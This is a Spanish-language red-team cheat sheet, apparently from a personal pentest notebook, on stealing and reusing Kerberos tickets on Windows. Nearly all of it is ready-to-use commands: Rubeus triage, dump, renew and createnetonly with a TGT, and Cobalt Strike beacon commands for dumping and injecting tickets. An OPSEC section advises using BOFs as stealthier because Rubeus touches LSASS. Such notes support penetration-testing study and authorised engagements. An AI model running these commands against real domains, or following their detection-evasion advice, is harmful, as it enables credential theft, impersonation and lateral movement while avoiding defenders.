---
tags: [credential-access, kerberos, rubeus, tickets]
status: done
platform: windows
---

# Kerberos Tickets

> Dump, análisis y reutilización de tickets Kerberos desde la sesión actual.

---

## Rubeus — Referencia Rápida

```
# Ver todos los tickets de todos los usuarios (requiere elevación)
Rubeus.exe triage

# Dump de todos los tickets (base64)
Rubeus.exe dump /nowrap

# Dump de ticket específico (por LUID)
Rubeus.exe dump /luid:0x3e4 /nowrap

# Inspeccionar un ticket
Rubeus.exe describe /ticket:<base64>

# Renovar un TGT que está próximo a expirar
Rubeus.exe renew /ticket:<base64> /ptt
```

---

## Alternativas BOF (más sigilosas)

```
beacon> triage         # BOF nativo de Cobalt Strike
beacon> kerberos_ticket_list
beacon> kerberos_ticket_dump
```

---

## Inyección de Tickets

```
# Via Rubeus (crea proceso aislado, inyecta TGT)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:admin /password:FakePass /ticket:<base64_TGT>

# Via Cobalt Strike
beacon> make_token DOMAIN\user FakePass
beacon> kerberos_ticket_use <ticket.kirbi>
```

→ Para Pass-the-Ticket completo: [[04 LATERAL MOVEMENT/User Impersonation/Pass The Ticket]]

---

## OPSEC

> ⚠️ El dump de tickets con Rubeus.exe genera el mismo problema que mimikatz: handle a LSASS.
> Preferir BOFs cuando estén disponibles.

